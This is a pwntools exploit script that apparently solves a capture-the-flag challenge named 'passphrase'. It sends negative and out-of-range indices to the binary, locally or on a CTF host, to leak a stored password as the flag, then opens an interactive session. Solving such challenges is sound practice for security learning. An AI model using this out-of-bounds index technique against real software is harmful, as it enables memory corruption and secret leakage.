#!/usr/bin/python3

from pwn import *

exe = ELF('passphrase', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # brva 0x186B 
                # brva 0x1899 
                # brva 0x01886
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
flag = ""
if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30013)
else:
        p = process(exe.path)

GDB()
i = 0
def x(idx, val):
        sla(b'with: ', str(val))
        sla(b'element: ', str(idx))

p.recvuntil(b'32: ')
for i in range(32):
        sl(str(0x1337))
sla(b'with: ', str(-11))
x(2, 5000)
x(3, 5000)
sla(b'with: ', str(-11))
sla(b'index: ', str(7))
p.recvuntil(b"The password was: ")
flag += hex(int(p.recvuntil(b' ',drop=True)))[2:]
info("flag: " + flag)
p.interactive()
